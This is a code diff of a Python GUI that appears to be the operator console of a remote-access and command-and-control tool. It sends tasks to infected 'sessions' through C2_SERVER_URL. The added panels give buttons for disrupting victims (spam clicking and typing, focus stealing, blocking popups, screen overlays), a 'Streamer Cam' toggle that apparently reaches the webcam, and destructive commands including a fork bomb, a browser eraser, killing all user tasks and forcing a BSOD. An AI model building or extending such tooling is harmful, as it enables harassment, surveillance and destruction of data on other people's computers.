@@ -57,10 +57,59 @@ class App(ctk.CTk):
         self.populate_control_panel(control_panel, session_id)
 
     def populate_control_panel(self, parent, session_id):
-        # All frames are included here
+        """### DEFINITIVE VERSION ### This function now contains ALL the control frames."""
+        
+        # --- Messaging Frame ---
         msg_frame = ctk.CTkFrame(parent); msg_frame.pack(fill="x", padx=10, pady=5)
-        # ... (all the button/slider creation code from the last correct version)
+        msg_frame.grid_columnconfigure(1, weight=1)
+        ctk.CTkLabel(msg_frame, text="Custom Popup", font=ctk.CTkFont(weight="bold")).grid(row=0, column=0, columnspan=4, pady=(5,10))
+        ctk.CTkLabel(msg_frame, text="Title:").grid(row=1, column=0, padx=5, pady=2, sticky="w")
+        popup_title_entry = ctk.CTkEntry(msg_frame, placeholder_text="Blocking Popup Title"); popup_title_entry.grid(row=1, column=1, columnspan=3, padx=5, pady=2, sticky="ew")
+        ctk.CTkLabel(msg_frame, text="Message:").grid(row=2, column=0, padx=5, pady=2, sticky="w")
+        popup_msg_entry = ctk.CTkEntry(msg_frame, placeholder_text="Blocking Popup Message..."); popup_msg_entry.grid(row=2, column=1, columnspan=3, padx=5, pady=2, sticky="ew")
+        ctk.CTkLabel(msg_frame, text="Icon:").grid(row=3, column=0, padx=5, pady=5, sticky="w")
+        icon_menu = ctk.CTkOptionMenu(msg_frame, values=["Info", "Warning", "Error", "Question"]); icon_menu.grid(row=3, column=1, padx=5, pady=5, sticky="w")
+        ctk.CTkLabel(msg_frame, text="Buttons:").grid(row=3, column=2, padx=5, pady=5, sticky="w")
+        button_menu = ctk.CTkOptionMenu(msg_frame, values=["OK", "OK_Cancel", "Yes_No"]); button_menu.grid(row=3, column=3, padx=5, pady=5, sticky="w")
+        def send_popup_task(): self.send_task("show_popup", {"title": popup_title_entry.get(), "message": popup_msg_entry.get(), "icon_style": icon_menu.get(), "button_style": button_menu.get()})
+        ctk.CTkButton(msg_frame, text="Show Popup", command=send_popup_task).grid(row=4, column=1, columnspan=3, pady=(5, 10))
+        
+        # --- Annoyance & Pranks Frame ---
+        annoy_frame = ctk.CTkFrame(parent); annoy_frame.pack(fill="x", padx=10, pady=5)
+        ctk.CTkLabel(annoy_frame, text="Annoyance & Pranks", font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=5, pady=5)
+        btn_frame1 = ctk.CTkFrame(annoy_frame, fg_color="transparent"); btn_frame1.pack(fill="x")
+        ctk.CTkButton(btn_frame1, text="Toggle Noise", command=lambda: self.send_task("toggle_noise")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(btn_frame1, text="Toggle Caps Lock Spam", command=lambda: self.send_task("toggle_caps_lock_spam")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(btn_frame1, text="Toggle USB Spam", command=lambda: self.send_task("toggle_usb_spam")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(btn_frame1, text="Toggle App Spam", command=lambda: self.send_task("toggle_app_spam")).pack(side="left", padx=5, pady=5)
+        btn_frame2 = ctk.CTkFrame(annoy_frame, fg_color="transparent"); btn_frame2.pack(fill="x")
+        ctk.CTkButton(btn_frame2, text="Toggle Random Clicking", command=lambda: self.send_task("toggle_random_clicking")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(btn_frame2, text="Toggle Random Typing", command=lambda: self.send_task("toggle_random_typing")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(btn_frame2, text="Toggle Focus Stealer", command=lambda: self.send_task("toggle_focus_stealer")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(btn_frame2, text="Toggle Cursor Changer", command=lambda: self.send_task("toggle_cursor_changer")).pack(side="left", padx=5, pady=5)
 
+        # --- Desktop & Visuals Frame ---
+        visual_frame = ctk.CTkFrame(parent); visual_frame.pack(fill="x", padx=10, pady=5)
+        ctk.CTkLabel(visual_frame, text="Desktop & Visuals", font=ctk.CTkFont(weight="bold")).pack(anchor="w", padx=5, pady=5)
+        wp_frame = ctk.CTkFrame(visual_frame, fg_color="transparent"); wp_frame.pack(fill="x")
+        wp_entry = ctk.CTkEntry(wp_frame, placeholder_text="C:\\path\\to\\image.jpg"); wp_entry.pack(side="left", padx=5, pady=5, expand=True, fill="x")
+        ctk.CTkButton(wp_frame, text="Set Wallpaper", command=lambda: self.send_task("set_wallpaper", {"path": wp_entry.get()})).pack(side="left", padx=5, pady=5)
+        overlay_frame = ctk.CTkFrame(visual_frame, fg_color="transparent"); overlay_frame.pack(fill="x", pady=5)
+        ctk.CTkLabel(overlay_frame, text="Overlay:").pack(side="left", padx=5)
+        overlay_color_menu = ctk.CTkOptionMenu(overlay_frame, values=["Black", "Red", "Blue", "Green", "White"]); overlay_color_menu.pack(side="left", padx=5)
+        alpha_slider = ctk.CTkSlider(overlay_frame, from_=0.1, to=1.0); alpha_slider.pack(side="left", padx=5, expand=True, fill="x"); alpha_slider.set(0.5)
+        def send_overlay_task(): self.send_task("toggle_overlay", {"color": overlay_color_menu.get().lower(), "alpha": alpha_slider.get()})
+        ctk.CTkButton(overlay_frame, text="Toggle Overlay", command=send_overlay_task).pack(side="left", padx=5)
+        ctk.CTkButton(visual_frame, text="Toggle Streamer Cam", command=lambda: self.send_task("toggle_streamer_cam")).pack(anchor="w", padx=5, pady=5)
+        
+        # --- Destructive Actions Frame ---
+        destructive_frame = ctk.CTkFrame(parent, fg_color="#2b2121"); destructive_frame.pack(fill="x", padx=10, pady=10)
+        ctk.CTkLabel(destructive_frame, text="Destructive Actions (Use With Caution)", font=ctk.CTkFont(weight="bold"), text_color="#f0c0c0").pack(anchor="w", padx=5, pady=5)
+        ctk.CTkButton(destructive_frame, text="Kill All User Tasks", command=lambda: self.send_task("kill_tasks"), fg_color="goldenrod", hover_color="darkgoldenrod").pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(destructive_frame, text="Browser Eraser", fg_color="darkorange", hover_color="#a15700", command=lambda: self.send_task("browser_eraser")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(destructive_frame, text="Fork Bomb", fg_color="firebrick", hover_color="darkred", command=lambda: self.send_task("fork_bomb")).pack(side="left", padx=5, pady=5)
+        ctk.CTkButton(destructive_frame, text="BSOD (Requires Admin)", fg_color="#580000", hover_color="#340000", command=lambda: self.send_task("bsod")).pack(side="left", padx=5, pady=5)
+        
     def send_task(self, command, args={}):
         if not self.active_session_id: messagebox.showwarning("Warning", "No active session selected."); return
         task_payload = {"session_id": self.active_session_id, "command": command, "args": args}
@@ -68,7 +117,6 @@ class App(ctk.CTk):
         except requests.exceptions.RequestException as e: messagebox.showerror("Error", f"Failed to send task: {e}")
 
     def on_closing(self): self.polling_active = False; self.destroy()
-
     def poll_for_sessions(self):
         while self.polling_active:
             try:
@@ -97,7 +145,7 @@ class App(ctk.CTk):
                 if sid in self.sessions: del self.sessions[sid]
 
     def add_session_widget(self, session_data):
-        """### FIX ### This version correctly creates the container frame and delete button."""
+        """This version includes the delete button."""
         sid, hostname = session_data["session_id"], session_data["hostname"]
         container = ctk.CTkFrame(self.sessions_frame, fg_color="transparent"); container.pack(fill="x", padx=5, pady=2)
         container.grid_columnconfigure(0, weight=1)
@@ -106,15 +154,11 @@ class App(ctk.CTk):
         self.session_widgets[sid] = {"frame": container, "button": button}
 
     def delete_session_handler(self, session_id):
-        """### NEW ### Handles the delete button click event."""
+        """This handles the delete button click event."""
         hostname = self.sessions.get(session_id, {}).get("hostname", "this session")
         if messagebox.askyesno("Confirm Deletion", f"Permanently delete {hostname}?"):
             try:
                 requests.post(f"{C2_SERVER_URL}/api/delete_session", json={"session_id": session_id}, timeout=10).raise_for_status()
-                # Manually remove from GUI to be instant
-                if session_id in self.session_widgets: self.session_widgets[session_id]["frame"].destroy(); del self.session_widgets[session_id]
-                if session_id in self.sessions: del self.sessions[session_id]
-                self.update_idletasks() # Refresh the layout
             except requests.exceptions.RequestException as e: messagebox.showerror("Error", f"Failed to send delete command: {e}")
 
     def build_payload_handler(self):
